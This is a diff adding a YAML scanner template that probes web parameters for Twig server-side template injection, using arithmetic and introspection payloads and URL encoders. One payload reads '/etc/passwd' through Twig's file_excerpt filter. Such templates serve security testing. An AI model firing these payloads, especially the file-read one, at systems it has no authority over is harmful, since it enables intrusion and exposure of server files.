@@ -1,0 +1,40 @@
+# templates/ssti/ssti-twig.yaml
+id: ssti-twig
+info:
+  name: Twig Server-Side Template Injection
+  author: shadowxp
+  severity: critical
+  description: Tests for Twig template injection vulnerabilities
+  tags:
+    - ssti
+    - twig
+    - php
+    - rce
+
+vulnerability_type: ssti
+
+request:
+  - method: GET
+    path: "{{BaseURL}}?{{parameter}}={{ssti_payload}}"
+    
+    matchers:
+      - type: word
+        words:
+          - "49"
+          - "7777777"
+        part: body
+
+payloads:
+  # Basic Twig syntax
+  - "{{7*7}}"
+  - "{{7*'7'}}"
+  # Twig specific
+  - "{{_self}}"
+  - "{{dump()}}"
+  # Filter tests
+  - "{{'test'|length}}"
+  - "{{'/etc/passwd'|file_excerpt(1,30)}}"
+
+encoders:
+  - url
+  - double_url
